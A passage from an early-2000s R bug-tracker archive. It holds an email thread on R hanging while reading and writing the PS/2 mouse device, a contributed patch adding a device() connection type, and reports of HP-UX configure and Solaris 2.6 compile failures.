> driver in R (why not?) and of course I have to send a couple commands to the
> device.  Typically, I send one byte, receive one acknowledgement byte, send
> another byte, receive an ACK, and so on.  At least this is what I would like to
> do.  Instead, after writing one byte, reading its acknowledgement byte, and
> writing a second byte, R hangs on the next read for an unknown reason.  I guess
> this is a bug in the read/write functions.  If you have a PS/2 device you may
> try to run the following code:
>
> ascii <- sapply(1:255, function(i)
> parse(text=paste("\"\\",structure(i,class="octmode"),"\"",sep=""))[[1]])
> dev <- file("/dev/psaux")
> open(dev, "w+b")
> writeChar(ascii[246], dev, eos=NULL)
> readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
> writeChar(ascii[246], dev, eos=NULL)
> readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
> close(dev)
>
> which gives:
>
> > ascii <- sapply(1:255, function(i)
> parse(text=paste("\"\\",structure(i,class="octmode"),"\"",sep=""))[[1]])
> > dev <- file("/dev/psaux")
> > open(dev, "w+b")
> > writeChar(ascii[246], dev, eos=NULL)
> > readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
> [1] 250
> > writeChar(ascii[246], dev, eos=NULL)
> > readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
> [...R hangs here...]
>
> It first creates an ascii table, opens the PS/2 device for binary read&write,
> writes the byte 0xF6 (246 in decimal, which means: set default; it is harmless),
> reads the acknowledgement byte 0xFA (250 in decimal), writes another 0xF6, and
> then hangs when reading the second acknowledgement byte.  If, instead, you close
> the device between the two writes, it's fine:
>
> > ascii <- sapply(1:255, function(i)
> parse(text=paste("\"\\",structure(i,class="octmode"),"\"",sep=""))[[1]])
> >
> > dev <- file("/dev/psaux", "w+b")
> > writeChar(ascii[246], dev, eos=NULL)
> > readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
> [1] 250
> > close(dev)
> >
> > dev <- file("/dev/psaux", "w+b")
> > writeChar(ascii[246], dev, eos=NULL)
> > readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
> [1] 250
> > close(dev)
>
> This is not a feature, is it? :-)  The behavior is the same in versions 1.4.1,
> 1.5.0 and 1.5.1 on my computer.  I don't have to send bytes very often, so I'll
> stick with the open-each-time strategy, but it is not very clean.
>
> I also tried to write bytes using the writeBin command, but it says the "size=1"
> is not available on my computer.  This is why I'm using the writeChar function.
>
> Please let me know if I'm doing something wrong.  I hope not.
>
> And thanks for the great software! :-)
>
> Johnny
>
> PS: if you try to run the code and don't get 250 as acknowledgement byte, it
> means the PS/2 controller is not in idle state.  Very unlikely though.  Try
> again as the set-default command should bring it back to its idle state.
>
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1688.followup.2 <==
From accot@free.fr  Thu Jun 20 20:07:49 2002
Received: from mailhub2.almaden.ibm.com (p1.almaden.ibm.com [198.4.83.52])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA15261
	for <R-bugs@biostat.ku.dk>; Thu, 20 Jun 2002 20:07:47 +0200 (MET DST)
Received: from free.fr (dhcp10136.almaden.ibm.com [9.1.10.136])
	by mailhub2.almaden.ibm.com (AIX4.3/8.9.3/8.9.3) with ESMTP id LAA22084;
	Thu, 20 Jun 2002 11:06:01 -0700
Message-ID: <3D121989.509@free.fr>
Date: Thu, 20 Jun 2002 11:06:01 -0700
From: Johnny Accot <accot@free.fr>
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.1a) Gecko/20020610
X-Accept-Language: en-us, fr, en
MIME-Version: 1.0
To: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
CC: R-bugs@biostat.ku.dk
Subject: Re: Maybe a problem in binary read/write (PR#1688)
References: <Pine.GSO.4.44.0206191008210.21134-100000@auk.stats>
Content-Type: multipart/mixed;
 boundary="------------010901020707080002040305"

This is a multi-part message in MIME format.
--------------010901020707080002040305
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hello,

Prof Brian D Ripley wrote:
> Not a bug: check the documentation of file(), which is documented to work
> for files but not for devices.  No attempt is made to cope with e.g.
> blocking on non-files.
> 
> It's a pretty extreme view of the world to consider /dev/psaux to be a
> file, and R is just using standard C <stdio.h> I/O.
> 
> However, this is a great opportunity for you to contribute a device()
> function to R.

I finally checked the code and "wrote" the functions to "handle devices".
Well, in fact I more or less duplicated the code for FIFOs, removed the
option for encoding, added an option for synchronous I/O, and added a
test to check that the file is indeed a character or block special file.
This works great for me but I'm afraid it is a bit simple and does not
cover much of device handling in general.  Especially I don't know if
anybody would want to use it for block devices, and what they would need.
The psaux device is one of the simplest device one could think of, that's
why it works so well.  For other devices one would need at least an
ioctl function, which I didn't write.  But still I have no idea whether
anybody would use it and what for.  Anyway.  Please let me know if you
think this is useful.  If yes, I will try to familiarize myself with
the structure of the R code and make the device handling more general.

Thanks,
Johnny

--------------010901020707080002040305
Content-Type: text/plain;
 name="R-1.5.1-device.patch"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="R-1.5.1-device.patch"

diff -ur R-1.5.1.orig/configure R-1.5.1/configure
--- R-1.5.1.orig/configure	2002-06-17 04:20:30.000000000 -0700
+++ R-1.5.1/configure	2002-06-19 19:33:22.000000000 -0700
@@ -17238,8 +17238,9 @@
 
 
 
+
 for ac_func in access chdir expm1 fcntl finite ftruncate getcwd \
-  getgrgid getpwuid getuid hypot isascii isnan log1p matherr mkfifo \
+  getgrgid getpwuid getuid hypot isascii isnan log1p matherr mkfifo mknod \
   popen putenv rint setenv strcoll stat strptime system times unsetenv
 do
 as_ac_var=`echo "ac_cv_func_$ac_func" | $as_tr_sh`
diff -ur R-1.5.1.orig/configure.ac R-1.5.1/configure.ac
--- R-1.5.1.orig/configure.ac	2002-04-30 11:04:05.000000000 -0700
+++ R-1.5.1/configure.ac	2002-06-19 19:25:04.000000000 -0700
@@ -982,7 +982,7 @@
 
 AC_FUNC_ALLOCA
 AC_CHECK_FUNCS(access chdir expm1 fcntl finite ftruncate getcwd \
-  getgrgid getpwuid getuid hypot isascii isnan log1p matherr mkfifo \
+  getgrgid getpwuid getuid hypot isascii isnan log1p matherr mkfifo mknod \
   popen putenv rint setenv strcoll stat strptime system times unsetenv)
 ## <NOTE>
 ## No need checking for bcopy bzero memcpy mempcpy even though ifnames
diff -ur R-1.5.1.orig/src/include/config.h.in R-1.5.1/src/include/config.h.in
--- R-1.5.1.orig/src/include/config.h.in	2002-04-24 02:54:05.000000000 -0700
+++ R-1.5.1/src/include/config.h.in	2002-06-19 19:35:10.000000000 -0700
@@ -216,6 +216,9 @@
 /* Define to 1 if you have the `mkfifo' function. */
 #undef HAVE_MKFIFO
 
+/* Define to 1 if you have the `mknod' function. */
+#undef HAVE_MKNOD
+
 /* Define to 1 if you have the <ndir.h> header file, and it defines `DIR'. */
 #undef HAVE_NDIR_H
 
diff -ur R-1.5.1.orig/src/include/Internal.h R-1.5.1/src/include/Internal.h
--- R-1.5.1.orig/src/include/Internal.h	2002-04-03 22:51:04.000000000 -0800
+++ R-1.5.1/src/include/Internal.h	2002-06-19 19:25:06.000000000 -0700
@@ -439,6 +439,7 @@
 SEXP do_isseekable(SEXP, SEXP, SEXP, SEXP);
 SEXP do_close(SEXP, SEXP, SEXP, SEXP);
 SEXP do_fifo(SEXP, SEXP, SEXP, SEXP);
+SEXP do_device(SEXP, SEXP, SEXP, SEXP);
 SEXP do_pipe(SEXP, SEXP, SEXP, SEXP);
 SEXP do_url(SEXP, SEXP, SEXP, SEXP);
 SEXP do_gzfile(SEXP, SEXP, SEXP, SEXP);
diff -ur R-1.5.1.orig/src/include/Rconnections.h R-1.5.1/src/include/Rconnections.h
--- R-1.5.1.orig/src/include/Rconnections.h	2002-03-10 05:20:42.000000000 -0800
+++ R-1.5.1/src/include/Rconnections.h	2002-06-19 20:09:26.000000000 -0700
@@ -28,7 +28,7 @@
     char* class;
     char* description;
     char mode[5];
-    Rboolean text, isopen, incomplete, canread, canwrite, canseek, blocking;
+    Rboolean text, isopen, incomplete, canread, canwrite, canseek, blocking, sync;
     Rboolean (*open)(struct Rconn *);
     void (*close)(struct Rconn *); /* routine closing after auto open */
     void (*destroy)(struct Rconn *); /* when closing connection */
@@ -58,6 +58,10 @@
     int fd;
 } *Rfifoconn;
 
+typedef struct deviceconn {
+    int fd;
+} *Rdeviceconn;
+
 typedef struct gzfileconn {
     void *fp;
     int cp;
diff -ur R-1.5.1.orig/src/library/base/man/connections.Rd R-1.5.1/src/library/base/man/connections.Rd
--- R-1.5.1.orig/src/library/base/man/connections.Rd	2002-03-10 05:20:42.000000000 -0800
+++ R-1.5.1/src/library/base/man/connections.Rd	2002-06-20 10:48:13.000000000 -0700
@@ -4,6 +4,7 @@
 \alias{file}
 \alias{pipe}
 \alias{fifo}
+\alias{device}
 \alias{gzfile}
 \alias{unz}
 \alias{bzfile}
@@ -31,6 +32,7 @@
 pipe(description, open = "", encoding = getOption("encoding"))
 fifo(description = "", open = "", blocking = FALSE,
      encoding = getOption("encoding"))
+device(description = "", open = "", blocking = TRUE, sync = TRUE)
 gzfile(description, open = "", encoding = getOption("encoding"),
        compression = 6)
 unz(description, filename, open = "", encoding = getOption("encoding"))
@@ -62,6 +64,7 @@
   \item{open}{character.  A description of how to open the connection
     (if at all). See Details for possible values.}
   \item{blocking}{logical.  See `Blocking' section below.}
+  \item{sync}{logical.  Should the device be opened for synchronous I/O?}
   \item{encoding}{An integer vector of length 256.}
   \item{compression}{integer in 0--9.  The amount of compression to be
     applied when writing, from none to maximal.  The default is a good
@@ -74,7 +77,7 @@
   \item{\dots}{arguments passed to or from other methods.}
 }
 \details{
-  The first eight functions create connections.  By default the
+  The first nine functions create connections.  By default the
   connection is not opened (except for \code{socketConnection}), but may
   be opened by setting a non-empty value of argument \code{open}.
 
@@ -135,8 +138,8 @@
   characters are mapped to a space in these encodings.
 }
 \value{
-  \code{file}, \code{pipe}, \code{fifo}, \code{url}, \code{gzfile} and
-  \code{socketConnection} return a connection object
+  \code{file}, \code{pipe}, \code{fifo}, \code{device}, \code{url},
+  \code{gzfile} and \code{socketConnection} return a connection object
   which inherits from class \code{"connection"} and has a first more
   specific class.
 
diff -ur R-1.5.1.orig/src/main/connections.c R-1.5.1/src/main/connections.c
--- R-1.5.1.orig/src/main/connections.c	2002-04-30 04:04:02.000000000 -0700
+++ R-1.5.1/src/main/connections.c	2002-06-19 20:12:34.000000000 -0700
@@ -640,6 +640,181 @@
 #endif
 }
 
+/* ------------------- device connections --------------------- */
+
+#if defined(HAVE_MKNOD) && defined(HAVE_FCNTL_H)
+
+#ifdef HAVE_STAT
+# ifndef Macintosh
+#  ifdef HAVE_SYS_TYPES_H
+#   include <sys/types.h>
+#  endif
+#  ifdef HAVE_SYS_STAT_H
+#   include <sys/stat.h>
+#  endif
+# else /* Macintosh */
+#  include <types.h>
+#  ifndef __MRC__
+#   include <stat.h>
+#  else
+#   include <mpw_stat.h>
+#  endif
+# endif /* Macintosh */
+#endif /* HAVE_STAT */
+
+#ifdef HAVE_ERRNO_H
+# include <errno.h>
+#endif
+
+static Rboolean device_open(Rconnection con)
+{
+    char *name;
+    Rdeviceconn this = con->private;
+    int fd, flags, res;
+    int mlen = strlen(con->mode);
+    struct stat sb;
+
+    name = R_ExpandFileName(con->description);
+    con->canwrite = (con->mode[0] == 'w' || con->mode[0] == 'a');
+    con->canread = !con->canwrite;
+    if(mlen >= 2 && con->mode[1] == '+') con->canread = TRUE;
+
+    /* check if the device exists and if it is a character or block device */
+    if(con->canwrite) {
+	res = stat(name, &sb);
+	if(res) { /* error, does not exist? */
+	    if(errno == ENOENT) warning("device `%s' does not exist", name);
+	    else warning("cannot find device `%s'", name);
+	    return FALSE;
+	} else {
+	    if(!(sb.st_mode & S_IFCHR) && !(sb.st_mode & S_IFBLK)) {
+		warning("`%s' exists but is neither a character special file nor a block special file", name);
+		return FALSE;
+	    }
+	}
+    }
+
+    if(con->canread && con->canwrite) flags = O_RDWR;
+    else if(con->canread) flags = O_RDONLY;
+    else flags = O_WRONLY;
+    if(!con->blocking) flags |= O_NONBLOCK;
+    if(con->sync) flags |= O_SYNC;
+    if(con->mode[0] == 'a') flags |= O_APPEND;
+    fd = open(name, flags);
+    if(fd < 0) {
+	if(errno == ENXIO) warning("device `%s' is not ready", name);
+	else warning("cannot open device `%s'", name);
+	return FALSE;
+    }
+    
+    this->fd = fd;
+    con->isopen = TRUE;
+
+    if(mlen >= 2 && con->mode[mlen-1] == 'b') con->text = FALSE;
+    else con->text = TRUE;
+    con->save = -1000;
+    return TRUE;
+}
+
+static int device_fgetc(Rconnection con)
+{
+    Rdeviceconn this = (Rdeviceconn)con->private;
+    unsigned char c;
+    int n;
+  
+    n = read(this->fd, (char *)&c, 1);
+    return (n == 1) ? c : R_EOF;
+}
+
+static Rconnection newdevice(char *description, char *mode)
+{
+    Rconnection new;
+    new = (Rconnection) malloc(sizeof(struct Rconn));
+    if(!new) error("allocation of device connection failed");
+    new->class = (char *) malloc(strlen("device") + 1);
+    if(!new->class) {
+	free(new);
+	error("allocation of device connection failed");
+    }
+    strcpy(new->class, "device");
+    new->description = (char *) malloc(strlen(description) + 1);
+    if(!new->description) {
+	free(new->class); free(new);
+	error("allocation of device connection failed");
+    }
+    init_con(new, description, mode);
+    new->open = &device_open;
+    new->close = &fifo_close;
+    new->vfprintf = &dummy_vfprintf;
+    new->fgetc = &device_fgetc;
+    new->seek = &null_seek;
+    new->truncate = &null_truncate;
+    new->fflush = &null_fflush;
+    new->read = &fifo_read;
+    new->write = &fifo_write;
+    new->private = (void *) malloc(sizeof(struct deviceconn));
+    if(!new->private) {
+	free(new->description); free(new->class); free(new);
+	error("allocation of device connection failed");
+    }
+    return new;
+}
+#endif
+
+SEXP do_device(SEXP call, SEXP op, SEXP args, SEXP env)
+{
+#if defined(HAVE_MKNOD) && defined(HAVE_FCNTL_H)
+    SEXP sfile, sopen, ans, class;
+    char *file, *open;
+    int i, ncon, block, sync;
+    Rconnection con = NULL;
+
+    checkArity(op, args);
+    sfile = CAR(args);
+    if(!isString(sfile) || length(sfile) < 1)
+	errorcall(call, "invalid `description' argument");
+    if(length(sfile) > 1)
+	warning("only first element of `description' argument used");
+    file = CHAR(STRING_ELT(sfile, 0));
+    sopen = CADR(args);
+    if(!isString(sopen) || length(sopen) != 1)
+	error("invalid `open' argument");
+    block = asLogical(CADDR(args));
+    if(block == NA_LOGICAL)
+	error("invalid `block' argument");
+    sync = asLogical(CADDDR(args));
+    if(sync == NA_LOGICAL)
+	error("invalid `sync' argument");
+    open = CHAR(STRING_ELT(sopen, 0));
+    ncon = NextConnection();
+    con = Connections[ncon] = newdevice(file, strlen(open) ? open : "r");
+    con->blocking = block;
+    con->sync = sync;
+
+    /* open it if desired */
+    if(strlen(open)) {
+	Rboolean success = con->open(con);
+	if(!success) {
+	    con_close(ncon);
+	    error("unable to open connection");
+	}
+    }
+
+    PROTECT(ans = allocVector(INTSXP, 1));
+    INTEGER(ans)[0] = ncon;
+    PROTECT(class = allocVector(STRSXP, 2));
+    SET_STRING_ELT(class, 0, mkChar("device"));
+    SET_STRING_ELT(class, 1, mkChar("connection"));
+    classgets(ans, class);
+    UNPROTECT(2);
+
+    return ans;
+#else
+    error("device connections are not available on this system");
+    return R_NilValue;		/* -Wall */
+#endif
+}
+
 /* ------------------- pipe connections --------------------- */
 
 #ifdef HAVE_POPEN
diff -ur R-1.5.1.orig/src/main/names.c R-1.5.1/src/main/names.c
--- R-1.5.1.orig/src/main/names.c	2002-04-04 14:11:31.000000000 -0800
+++ R-1.5.1/src/main/names.c	2002-06-20 10:38:39.000000000 -0700
@@ -692,9 +692,6 @@
 {"dev.control",	do_devcontrol,	0,	111,	0,	PP_FUNCALL},
 {"dev.copy",	do_devcopy,	0,	111,	1,	PP_FUNCALL},
 {"dev.cur",	do_devcur,	0,	111,	0,	PP_FUNCALL},
-/*
-{"device",	do_device,	0,	111,	3,	PP_FUNCALL},
-*/
 {"dev.next",	do_devnext,	0,	111,	1,	PP_FUNCALL},
 {"dev.off",	do_devoff,	0,	111,	1,	PP_FUNCALL},
 {"dev.prev",	do_devprev,	0,	111,	1,	PP_FUNCALL},
@@ -793,6 +790,7 @@
 {"url", 	do_url,		0,      11,     4,      PP_FUNCALL},
 {"pipe", 	do_pipe,	0,      11,     3,      PP_FUNCALL},
 {"fifo", 	do_fifo,	0,      11,     4,      PP_FUNCALL},
+{"device", 	do_device,	0,      11,     4,      PP_FUNCALL},
 {"gzfile", 	do_gzfile,	0,      11,     4,      PP_FUNCALL},
 {"unz", 	do_unz,		0,      11,     3,      PP_FUNCALL},
 {"bzfile", 	do_bzfile,	0,      11,     3,      PP_FUNCALL},

--------------010901020707080002040305--


==> 1688.followup.3 <==
From ripley@stats.ox.ac.uk  Thu Jun 20 20:44:01 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA15376
	for <R-bugs@biostat.ku.dk>; Thu, 20 Jun 2002 20:44:01 +0200 (MET DST)
From: ripley@stats.ox.ac.uk
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id TAA10803;
	Thu, 20 Jun 2002 19:43:18 +0100 (BST)
Date: Thu, 20 Jun 2002 19:43:18 +0100 (BST)
X-X-Sender:  <ripley@gannet.stats>
To: Johnny Accot <accot@free.fr>
cc: <R-bugs@biostat.ku.dk>
Subject: Re: Maybe a problem in binary read/write (PR#1688)
In-Reply-To: <3D121989.509@free.fr>
Message-ID: <Pine.LNX.4.31.0206201942270.9210-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Thu, 20 Jun 2002, Johnny Accot wrote:

> Hello,
>
> Prof Brian D Ripley wrote:
> > Not a bug: check the documentation of file(), which is documented to work
> > for files but not for devices.  No attempt is made to cope with e.g.
> > blocking on non-files.
> >
> > It's a pretty extreme view of the world to consider /dev/psaux to be a
> > file, and R is just using standard C <stdio.h> I/O.
> >
> > However, this is a great opportunity for you to contribute a device()
> > function to R.
>
> I finally checked the code and "wrote" the functions to "handle devices".
> Well, in fact I more or less duplicated the code for FIFOs, removed the
> option for encoding, added an option for synchronous I/O, and added a
> test to check that the file is indeed a character or block special file.
> This works great for me but I'm afraid it is a bit simple and does not
> cover much of device handling in general.  Especially I don't know if
> anybody would want to use it for block devices, and what they would need.
> The psaux device is one of the simplest device one could think of, that's
> why it works so well.  For other devices one would need at least an
> ioctl function, which I didn't write.  But still I have no idea whether
> anybody would use it and what for.  Anyway.  Please let me know if you
> think this is useful.  If yes, I will try to familiarize myself with
> the structure of the R code and make the device handling more general.

Yes, I do think it would be useful, but I know little about it,
Thank you for the offer.

>
> Thanks,
> Johnny
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  Installation

* PR# 1222 *
Subject: configure: sed: Function s%@PDFLATEX@%/usr/local/bin/pdflatex%g
From: Peter Kleiweg <kleiweg@let.rug.nl>
Date: Thu, 20 Dec 2001 14:09:42 +0100 (CET)
--problem is on hppa2.0-hp-hpux10.20: may be HP-UX specific
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1222 <==
From postmaster@franz.stat.wisc.edu  Thu Dec 20 14:10:13 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA13749
	for <r-bugs@biostat.ku.dk>; Thu, 20 Dec 2001 14:10:12 +0100 (MET)
Received: from kleigh.nl (really [213.84.55.218]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m16H2xF-000IXfC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Thu, 20 Dec 2001 07:09:45 -0600 (CST) 
Received: from kleigh.nl (kleigh [127.0.0.1])
	by kleigh.nl (8.12.0/8.12.0) with ESMTP id fBKD9goQ007981
	for <r-bugs@r-project.org>; Thu, 20 Dec 2001 14:09:43 +0100
Received: from localhost (peter@localhost)
	by kleigh.nl (8.12.0/8.12.0/Submit) with ESMTP id fBKD9gPQ007978
	for <r-bugs@r-project.org>; Thu, 20 Dec 2001 14:09:42 +0100
X-Authentication-Warning: kleigh.nl: peter owned process doing -bs
Date: Thu, 20 Dec 2001 14:09:42 +0100 (CET)
From: Peter Kleiweg <kleiweg@let.rug.nl>
X-X-Sender:  <kleiweg@kleigh.nl>
To: <r-bugs@r-project.org>
Subject: configure: sed: Function s%@PDFLATEX@%/usr/local/bin/pdflatex%g
 cannot be parsed.
Message-ID: <Pine.LNX.4.33.0112201304160.476-100000@kleigh.nl>
Organization: Alfa-Informatica, Rijksuniversiteit Groningen
X-Accept-Language: nl,en,ia,af,de,da,no,sv,fr,it
X-Alert: http://www.opensource.org/halloween/
X-Face: "K~X:~!ydgSdjNy;]_+BCb\OM^pqyg_q*Le84$l46M\-mL=.^,L4B}bDK>`o#r4_>O*
X-Mailer: Pine 4.33, Linux 2.0.36, i586
X-Reason: http://www.interlingua.com/
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII


Sometimes, configure isn't able to create the makefiles. It
produces errors like:

sed: Function s%@PDFLATEX@%/usr/local/bin/pdflatex%g cannot be parsed.

This happens when I use a combination of arguments to configure like:

    --prefix=$HOME/R-tst
    --with-tcl-config=/opt_local/opt/tcl/lib/tclConfig.sh
    --with-tk-config=/opt_local/opt/tk/lib/tkConfig.sh

If I leave out the last two arguments, the problem does not
occur.

If I change the first argument to --prefix=$HOME/Rtst, the
problem does not occur.

--please do not edit the information below--

Version:
 platform = hppa2.0-hp-hpux10.20
 arch = hppa2.0
 os = hpux10.20
 system = hppa2.0, hpux10.20
 status =
 major = 1
 minor = 4.0
 year = 2001
 month = 12
 day = 19
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base


==> 1222.audit <==
Fri Dec 21 06:19:29 2001	ripley	changed notes
Fri Dec 21 06:19:29 2001	ripley	foobar
Fri Dec 21 06:19:29 2001	ripley	moved from incoming to Installation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1268 *
Subject: Solaris 2.6 Compile
From: gm81640@development.nssmb.com
Date: Thu, 17 Jan 2002 06:28:26 +0100 (MET)
--Most likely a compiler installation problem
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1268 <==
From gm81640@development.nssmb.com  Thu Jan 17 06:28:36 2002
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id GAA21618
	for <R-bugs@biostat.ku.dk>; Thu, 17 Jan 2002 06:28:26 +0100 (MET)
Date: Thu, 17 Jan 2002 06:28:26 +0100 (MET)
From: gm81640@development.nssmb.com
Message-Id: <200201170528.GAA21618@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: Solaris 2.6 Compile

Full_Name: Geordon Marchak
Version: R-1.3.1
OS: Solaris 2.6
Submission from: (NULL) (199.67.239.91)


Got the following error when compiling on Solaris 2.6 with the standard GNU
gcc package (from the Sun site).   BTW - linux compiles no problem (and fast
too :-)

# make
`Makedeps' is up to date.
gcc -I. -I../../src/include -I../../src/include -I/usr/local/include
-DHAVE_CONFIG_H   -g -O2 -c lbfgsb.c -o lbfgsb.o
/usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12959: error: unknown opcode
".subsection"
/usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12959: error: statement syntax
/usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12971: error: unknown opcode
".previous"
/usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12971: error: statement syntax
*** Error code 1
make: Fatal error: Command failed for target `lbfgsb.o'
Current working directory /home/gm81640/R-1.3.1/src/appl
*** Error code 1
make: Fatal error: Command failed for target `R'
Current working directory /home/gm81640/R-1.3.1/src/appl
*** Error code 1
make: Fatal error: Command failed for target `R'
Current working directory /home/gm81640/R-1.3.1/src
*** Error code 1
make: Fatal error: Command failed for target `R'


==> 1268.followup.1 <==
From ripley@stats.ox.ac.uk  Thu Jan 17 09:37:45 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id JAA23207
	for <R-bugs@biostat.ku.dk>; Thu, 17 Jan 2002 09:37:45 +0100 (MET)
Received: from gannet.stats (IDENT:root@gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id IAA21901;
	Thu, 17 Jan 2002 08:37:15 GMT
Received: from localhost (ripley@localhost)
	by gannet.stats (8.11.3/8.11.3) with ESMTP id g0H8bFj02561;
	Thu, 17 Jan 2002 08:37:15 GMT
X-Authentication-Warning: gannet.stats: ripley owned process doing -bs
Date: Thu, 17 Jan 2002 08:37:15 +0000 (GMT)
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
X-X-Sender:  <ripley@gannet.stats>
To: <gm81640@development.nssmb.com>
cc: <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] Solaris 2.6 Compile (PR#1268)
In-Reply-To: <200201170528.GAA21628@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0201170827260.2465-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Thu, 17 Jan 2002 gm81640@development.nssmb.com wrote:

> Full_Name: Geordon Marchak
> Version: R-1.3.1
> OS: Solaris 2.6
> Submission from: (NULL) (199.67.239.91)
>
>
> Got the following error when compiling on Solaris 2.6 with the standard GNU
> gcc package (from the Sun site).   BTW - linux compiles no problem (and fast
> too :-)

You sent this twice, for some reason.

It's hard to tell what `the standard GNU gcc package (from the Sun site)'
actually is.  However, R 1.3.1 did compile under Solaris 2.6 with gcc
2.95.3 compiled under Solaris 2.6.  The error appears to be a mismatch
between your compiler and your assembler.  I don't think that qualifies as
a bug in R, and definitely is one we can do nothing about.  lbfgsb.c does
seem to be valid C that is accepted by a wide range of compilers on
Solaris and elsewhere.


> # make
> `Makedeps' is up to date.
> gcc -I. -I../../src/include -I../../src/include -I/usr/local/include
> -DHAVE_CONFIG_H   -g -O2 -c lbfgsb.c -o lbfgsb.o
> /usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12959: error: unknown opcode
> ".subsection"
> /usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12959: error: statement syntax
> /usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12971: error: unknown opcode
> ".previous"
> /usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12971: error: statement syntax
> *** Error code 1
> make: Fatal error: Command failed for target `lbfgsb.o'
> Current working directory /home/gm81640/R-1.3.1/src/appl
> *** Error code 1
> make: Fatal error: Command failed for target `R'
> Current working directory /home/gm81640/R-1.3.1/src/appl
> *** Error code 1
> make: Fatal error: Command failed for target `R'
> Current working directory /home/gm81640/R-1.3.1/src
> *** Error code 1
> make: Fatal error: Command failed for target `R'
>
>
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1268.reply.1 <==
From p.dalgaard@biostat.ku.dk  Thu Jan 17 11:46:44 2002
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA25668;
	Thu, 17 Jan 2002 11:46:44 +0100 (MET)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id g0HAjXh15735;
	Thu, 17 Jan 2002 11:45:33 +0100
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
Sender: pd@pubhealth.ku.dk
To: ripley@stats.ox.ac.uk
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] Solaris 2.6 Compile (PR#1268)
References: <200201170837.JAA23228@pubhealth.ku.dk>
